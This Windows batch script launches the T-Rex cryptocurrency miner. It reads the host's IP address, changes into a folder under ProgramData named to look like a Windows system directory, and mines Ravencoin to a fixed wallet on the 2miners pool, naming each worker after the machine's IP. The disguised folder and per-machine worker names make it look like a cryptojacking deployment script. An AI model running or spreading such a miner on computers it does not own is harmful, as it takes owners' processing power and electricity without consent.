@echo off
for /f "tokens=*" %%a in ('ipconfig ^| findstr "IPv4 Address"') do (
    set "ip=%%a"
)

for /f "tokens=2 delims=:" %%b in ("%ip%") do (
    set "last_ip=%%b"
)

set "last_ip=%last_ip: =%"

cd %systemdrive%\programdata\windows
t-rex.exe -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RTKJqEgZEwNLdAvuTS6eRMJYp52YmqYBj7.%last_ip% -p x
pause
